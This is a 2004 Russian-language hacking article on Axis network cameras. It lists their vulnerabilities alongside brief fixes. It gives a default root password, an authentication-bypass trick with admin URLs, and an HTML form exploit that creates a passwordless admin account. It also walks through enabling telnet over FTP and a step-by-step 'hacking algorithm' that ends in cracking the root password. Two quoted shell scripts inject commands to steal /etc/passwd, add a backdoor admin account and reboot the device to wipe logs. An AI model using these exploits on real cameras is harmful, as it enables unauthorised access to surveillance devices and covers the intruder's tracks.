@@ -1,0 +1,371 @@
+Исследование сетевых камер семейства AXIS.
+
+Написана : InuYasha / Sep 2004
+
+Приветы группе The Clash, Chris Gragsone
+
+В  статье приводится  исследование безопасноти  сетевых  видеокамер  фирмы Axis,
+перечень уязвимостей, методы их использования и устранения. Статья будет полезна
+как для исследователей так и для администраторов данных устройств.
+
+Содержание
+		0х00. Введение
+		0х01. Идентификация устройства как Axis Network Camera
+		0х02. Обзор уязвимостей, их использование и устранение
+			0х03. Пароль по-умолчанию
+ 			0х04. Директории и файлы свободного доступа
+ 			0х05. Обход аутентификации
+ 			0х06. Переполнение стека - атака на отказ
+ 		0х07. Запуск telnet-сервиса на веб-камере
+ 		0х08. Алгоритм взлома
+ 		0х09. Переустановка ПО камеры - шаг за шагом
+ 		
+
+0x00. Введение.
+
+Вебкамеры  фирмы Axis  Communications это  устройства, созданные  для захвата  и
+трансляции видеоизображения по IP-сетям, это полнофункциональные компьютеры  под
+управлением Linux,  построенные восновном  на 100MhZ  RISC-процессоре, с сетевым
+интерфейсом,  через  который  они  могут  быть  подключены  к  IP-сети (например
+Internet)  через  LAN,  модемное  подключение,  или  радио-сеть  (802.11b).   На
+вебкамере  по-умолчанию  исполняются  http  и  ftp  серверы,  есть  удобный  веб
+-интерфейс  управления  камерой,  можно  настроить  telnet  для  более   полного
+контроля.  Вебкамерами этой  фирмы часто  пользуются учебные  или муниципальные
+заведения восновном  для обозрения  месности и  трансляции панорам  ихних красот
+любому желающему в Интернет. Камеры более поздних моделей применяются в охранных
+системах, поскольку они имеют интерфейсс аналоговыми сетями передачи видео ССTV,
+скорость  которых  позволяет  транслировать  видео  в  реальном  режиме.   Более
+подробную информацию о  типах видео оборудования  этой фирмы вы  можете найти на
+сайте http://www.axis.com, а мы же приступим к изучению безопасности.
+
+
+0х01. Идентификация устройства как Axis Network Camera
+
+При стандартной конфигурации у веб-камеры открыто два порта - 21 и 80.
+
+На  80  порту  открыт  http-сервер.  Если  зайти  браузером  на этот порт,  то в
+открывшейся странице  мы в  поле TITLE  должны увидеть  "Axis xxx Network Camera
+y.yy",  где  xxx  -  модель,  например  2100,  а  y.yy  -  версия   программного
+обеспечения, например 2.32.
+
+На запрос "HEAD" (GET HEAD / HTTP/1.0) получаем :
+
+	HTTP/1.0 200 OK
+	Date: Thu, 13 Apr 2004 12:21:19 GMT
+	Server: Boa/0.92o
+	Content-Length: 318
+	Content-Type: text/html
+	Last-Modified: Thu, 13 Apr 2004 xx:xx:xx GMT
+	Client-Date: Thu, 13 Apr 2004 xx:xx:xx GMT
+	Client-Response-Num: 1
+
+Версия "Server" может быть другой, но сам сервер неизменно Boa.
+
+
+На 21 порту открыт ftp-сервер.
+
+При соединении показывает примерно следующее :
+
+	yasha# ftp xxx.xxx.xxx.xxx
+	Connected to xxx.xxx.xxx.xxx
+	220 Axis 2120 Network Camera 2.12 Apr 04 2002 ready.
+	User (xxx.xxx.xxx.xxx:(none)): test
+	331 User name okay, need password.
+	Password: test
+	230 User logged in, proceed.
+	^C
+
+Хинт : можно написать небольшой сканер устройств данного типа.
+Принцип :  Cканируем эти  хосты на  21 и  80 порты,  и если  таковы открыты, то,
+соединившись на них, забираем баннер и просматриваем его на наличие определённых
+ключевых строк. Для http-баннера это может быть "Server: Boa", а для ftp "Axis".
+Вот и всё. Программа очень легко реализуема, но писать её никто не стал.  Зачем?
+Кому надо найти, - тот и так найдёт ;)
+
+0х02. Обзор уязвимостей, их использование и устранение.
+
+ 0х03. Пароль по-умолчанию
+
+	Описание : Вход в систему  для пользователя root имеет заводской  пароль
+	"pass", часто администраторы забывают его менять.
+
+	Использование  :  Пароль  используется  при  доступе  к   веб-интерфейсу
+	администрирования  камеры, а  также на  ftp по-умолчанию  разрешен вход
+	пользователю root.
+
+	Фикс : Не забывайте менять заводские пароли!
+
+
+
+ 0х04. Директории и файлы свободного доступа
+
+	Описание : На сервере существуют директории и файлы, которые не защищены
+	паролем.
+
+        Использование : Вы можете просматривать следующие файлы и директории :
+  
+        	/java/ - тут содержится java-код используемый сервером
+		/java/users.shtml - это, например, алгоритм для зашифровки пароля
+		/jpg/
+		/pics/
+		/support/
+		/support/messages - файл /var/log/messages
+		/demo/edu640x480jav.shtml - ;)
+
+
+	Фикс :  из вышеприведённого  единственную опасность  представляет только
+	открытый   для   общего   доступа   лог-файл.   Эта   проблема  решается
+	конфигурированием http-сервера :
+
+		в файл /etc/httpd/conf/boa.conf
+		добавить следующие строки :
+
+			AuthPath /usr/html/support/ axadmin
+			AuthPath /support/ axadmin
+
+
+ 0х05. Обход аутентификации
+
+	Описание  : В  реализации программного  обеспечения допущена  ошибка,  с
+	помощью   которой   можно   получить   доступ   к   ресурсам   требующим
+	аутентификации. В запросе после адреса ставим два "/" и получаем доступ.
+
+	Использование : 
+
+	http://x.x.x.x//admin/admin.shtml - вход в интерфейс администрирования 
+					    без пароля.
+					    
+	http://x.x.x.x//admin/img_general.shtml - настройка изображения
+
+	http://x.x.x.x//admin/netw_tcp.shtml - настройки сетевых параметров
+
+	http://x.x.x.x//admin/sys_date.shtml - настройка даты и времени
+
+	http://x.x.x.x//admin/com_port.shtml - настройка внешних устройств
+
+	http://x.x.x.x//demo/
+
+	http://x.x.x.x//admin/sec_users.shtml -  мы получаем  доступ к  странице
+	администрирования  пользовательских  аккаунтов.  Но  внести   какие-либо
+	данные просто так у вас не получится. Далее приводится эксплойт, который
+	создаёт  на сервере  пользвателя "user"  с правами  ADV (Administrator,
+	Dial-up, View)  и без  пароля. После  применения эксплойта  заходите под
+	новосозданным аккаунтом, а дальше уж дело вкуса.
+				
+	<HTML>
+	<HEAD>
+	<TITLE>Axis Network Camera Exploit by InuYasha</TITLE>
+	</HEAD>
+	<BODY>
+	<FORM NAME="WizardForm" ACTION="http://x.x.x.x//this_server/ServerManager.srv" METHOD="POST">
+	<INPUT NAME="conf_Security_List" VALUE='user:ADVO::'>
+	<INPUT TYPE="HIDDEN" NAME="servermanager_do" VALUE="set_variables">  
+	<INPUT TYPE="SUBMIT" VALUE="[+]">
+	</FORM>
+	</BODY>
+	</HTML>
+
+	Фикс : Обновить программное обеспечение
+
+	AXIS 2100 Network Camera: 2.40 ftp://ftp.axis.com/pub_soft/cam_srv/cam_2100/2_40/
+	AXIS 2110 Network Camera: 2.40 ftp://ftp.axis.com/pub_soft/cam_srv/cam_2110/2_40/
+	AXIS 2120 Network Camera: 2.40 ftp://ftp.axis.com/pub_soft/cam_srv/cam_2120/2_40/
+	AXIS 2130 Network Camera: 2.40 ftp://ftp.axis.com/pub_soft/cam_srv/cam_2130/2_40/
+	AXIS 2400 Video Server: 2.40 ftp://ftp.axis.com/pub_soft/cam_srv/cam_2400/2_40/
+	AXIS 2401 Video Server: 2.40 ftp://ftp.axis.com/pub_soft/cam_srv/cam_2401/2_40/
+	AXIS 2411 Video Server: 3.12 ftp://ftp.axis.com/pub_soft/cam_srv/cam_2411/3_12/
+	AXIS 2420 Network Camera: 2.40 ftp://ftp.axis.com/pub_soft/cam_srv/cam_2420/2_40/
+	AXIS 2460 Network DVR: 3.11 ftp://ftp.axis.com/pub_soft/cam_srv/cam_2460/3_11/
+	AXIS 250S Video Server: 3.10 ftp://ftp.axis.com/pub_soft/cam_srv/cam_250s/3_10/
+
+ 0х06. Переполнение стека - атака на отказ
+
+	Описание :  из-за того,  что скрипт  command.cgi не  правильно проверяет
+	входящие данные, мы можем использовать переполнение стека, что  позволит
+	создавать и  перезаписывать файлы  на сервере  (и не  только ;)  ), если
+	перезаписать системные файлы то получим отказ в обслуживании.
+	
+	Фикс : Скачать и установить новое программное обеспечение с исправлениями.
+	
+	Axis 2100 Network Camera (2.33.1) - ftp://ftp.axis.com/pub_soft/cam_srv/cam_2100/sr/
+        Axis 2110 Network Camera (2.33.1) - ftp://ftp.axis.com/pub_soft/cam_srv/cam_2110/sr/
+        Axis 2120 Network Camera (2.33.1) - ftp://ftp.axis.com/pub_soft/cam_srv/cam_2120/sr/
+        Axis 2420 Network Camera (2.33.1) - ftp://ftp.axis.com/pub_soft/cam_srv/cam_2420/sr/
+        Axis 2130 PTZ Network Camera (2.32.1) - ftp://ftp.axis.com/pub_soft/cam_srv/cam_2130/sr/
+	Axis 2400 Video Server (2.33.1) - ftp://ftp.axis.com/pub_soft/cam_srv/cam_2400/sr/
+	Axis 2401 Video Server (2.33.1) - ftp://ftp.axis.com/pub_soft/cam_srv/cam_2401/sr/
+	Axis 250S MPEG-2 Video Server (3.02 RC1) - ftp://ftp.axis.com/pub_soft/cam_srv/cam_250s/latest/
+	Axis 2460 Network Digital Video Recorder (3.01) - ftp://ftp.axis.com/pub_soft/cam_srv/cam_2460/latest/
+	Axis 2490 Serial Server (2.11.1) - ftp://ftp.axis.com/pub_soft/cam_srv/cam_2490/sr/
+
+
+0х07. Запуск telnet-сервиса на веб-камере
+
+По-умолчанию телнет-сервис отключен, и что бы получить доступ к командной строке
+нам нужно запустить телнет-сервис на удалённой машине.
+
+Для этого запустите ftp-клиент и проделайте следующее :
+
+yasha# ftp x.x.x.x
+Connected to x.x.x.x
+220 Axis 2100 Network Camera 2.12 Apr 13 2004 ready.
+User (x.x.x.x:(none)): ВАШ ЛОГИН
+331 User name okay, need password.
+Password: ПАРОЛЬ
+230 User logged in, proceed.
+ftp> ascii
+ftp> cd /etc
+ftp> get inittab
+200 Command okay.
+150 Opening data connection.
+226 Transfer complete.
+ftp: 1380 bytes received in 0,01Seconds 148,00Kbytes/sec.
+
+Теперь  откройте  для редактирования  скачанный  файл inittab  и  найдите в  нём
+следующие строки :
+
+#telnetd:3:respawn:/bin/telnetd
+Удалите ”#”, строка долдна иметь такой вид :
+telnetd:3:respawn:/bin/telnetd
+
+Сохраните файл
+
+теперь вернёмся к нашей ftp-сессии и возвратим исправленный файл на место :
+
+ftp> put inittab
+200 Command okay.
+150 Opening data connection.
+226 Transfer complete.
+ftp: 1379 bytes sent in 0,01Seconds 2424002,00Kbytes/sec.
+250 Command successful.
+ftp> bye
+221 Goodbye.
+
+Перезагрузите камеру и после этого вы получите к веб-камере доступ по telnet.
+
+
+0х08. Алгоритм взлома
+
+Под взломом мы подразумеваем проникновение в систему и получение пароля root.
+
+1. Идентифицируем сетевое устройство как Axis Network Camera, смотрим в баннерах 
+модель камеры и версию ПО, что бы узнать уязвимости.
+2. Пробуем использовать уязвимости, создаём новый аккаунт
+3. По ftp скачиваем /etc/passwd
+4. Расшифровываем пароль root'a
+5. Запускаем telnet-сервис на взломанной машине
+6. ;)
+
+0х09. Переустановка ПО камеры - шаг за шагом
+
+1.  Скачайте  с  сервера  образ  нового ПО  для  вашей  камеры,  он  будет иметь
+расширение ".bin"
+2. Удостоверьтесь, что любая трансляция видео или картинок остановлена.
+3. Сохраните ваши файлы настроек (если они вам конечно нужны) директория "/etc"
+4. Соединитесь с ftp-сервисом камеры под аккаунтом root
+5. Установите тип передачи данных в бинарный командой "bin"
+6. Введите команду "hash" что бы видеть процесс обновления
+7. Загрузите в  камеру новое ПО  командой "put xxx.bin  flash_all", где xxx.bin 
+- это образ нового ПО.
+8. После окончания загрузки камера автоматически перезагрузится и будет работать
+с новым ПО.
+
+
+Редакционное послесловие: 
+
+Первые (насколько нам известно) сведения по открытому в статье вопросу появились в
+Full-Disclosure в августе 2004, за авторством bashis. На русском языке информация
+не публиковалась. Так же имеются все основания утверждать, что статья не является
+рипом поста в Full-Disclosure.
+
+Выдержки из упомянутого поста:
+
+/* Public disclosure due lack of responce from Axis Communications */
+
+----[ axis-passwd.sh ]----
+
+#!/bin/sh
+
+# Get /etc/passwd from:
+# Axis 2100/2110/2120/2420 Network Camera 2.34/2.40
+# AXIS 2130 PTZ Network Camera
+# AXIS 2400/2401 Video Server
+# (There may be more devices vulnerable)
+
+# Problem:
+# PARAMETER=`echo $QUERY_STRING | sed 's/\(^.*\)=.*$/\1/'`
+# in 'virtualinput.cgi'
+
+# Bug found and code by bashis <mcw+at+wcd.se> 2004-08
+# Greets: #hack.se @EFnet
+
+# FAQ:
+# Q: Where is the cam's?
+# A: Google is your friend.
+
+if [ ${#*} -ne 2 ]
+then
+printf "\nUsage: %s <ip> <port>\n\n" $0
+exit 1
+fi
+
+printf "+++ Sending request to %s:%d\n+++ Received:\n" $1 $2
+printf "GET /axis-cgi/io/virtualinput.cgi?\x60cat</etc/passwd>/mnt/flash/etc/httpd/html/pa
+sswd\x60 HTTP/1.1\n\n" | nc $1 $2
+printf "+++ Yeah, right.. for you maybe, but not for me ;->\n\n+++ Get the passwd file now\n+
+++ Received:\n"
+printf "GET /local/passwd HTTP/1.0\n\n" | nc $1 $2
+printf "\n+++ Thats it.. Thanks for using Axis Airlines!\n"
+
+----[ axis-wh00t.sh ]----
+
+#!/bin/sh
+
+# Add admin account with l/p: wh00t/wh00t
+# Axis 2100/2110/2120/2420 Network Camera 2.12-2.40
+# AXIS 2130 PTZ Network Camera
+# AXIS 2400/2401 Video Server
+# (There may be more devices vulnerable)
+
+# Problem:
+# POST action follows "/../"
+
+# Bug found and code by bashis <mcw+at+wcd.se> 2004-08
+# Greets: #hack.se @EFnet
+
+# 2.12 seems to very buggy version, it add wh00t account,
+# but editcgi.cgi seems not to work..
+
+# Yes, you can use 'editcgi.cgi' to edit /etc/passwd
+# and change/add what you want, or browse around in filesystem.
+
+# FAQ:
+# Q: Where is the cam's?
+# A: Google is your friend.
+
+if [ ${#*} -ne 2 ]
+then
+printf "\nUsage: %s <ip> <port>\n\n" $0
+exit 1
+fi
+
+printf "+++ Sending request to %s:%d\n" $1 $2
+printf "+++ If all went well, you should see the password file soon...\n+++ Received:\n\n"
+printf "POST /cgi-bin/scripts/../../this_server/ServerManager.srv HTTP/1.0\nContent-Length: 250\
+nPragma: no-cache\n\nconf_Security_List=root%%3AADVO%%3A%%3Awh00t%%3AAD%%3A119104048048116%%3A&us
+ers=wh00t&username=wh00t&password1=wh00t&password2=wh0
+0t&checkAdmin=on&checkDial=on&checkView=on&servermanager_return_page=%%2Fadmin%%2Fsec
+_users.shtml&servermanager_do=set_variables\n"
+| nc $1 $2 > /dev/null
+# Note.......^^^^^^^^^^^^^^^^^^^^^^
+
+printf "GET /admin-bin/editcgi.cgi?file=/etc/passwd HTTP/1.0\nHost: 127.0.0.1\nAuthorization: B
+asic d2gwMHQ6d2gwMHQ=\n\n" | nc $1
+$2
+# it's good to clear logfile, so let us reboot the device now
+printf "GET /cgi-bin/admin/restart.cgi HTTP/1.0\nAuthorization: Basic d2gwMHQ6d2gwMHQ=\n\n"
+| nc $1 $2 > /dev/null
+printf "\n\n+++ You can edit file(s) and browse around filesystem with:\nhttp://$1/admin-bin/edi
+tcgi.cgi?file=\n"
+printf "+++ Login with wh00t/wh00t (yes, you can edit /etc/passwd)\n"
+printf "\n+++ Thats it.. Thanks for using Axis Airlines!\n" 
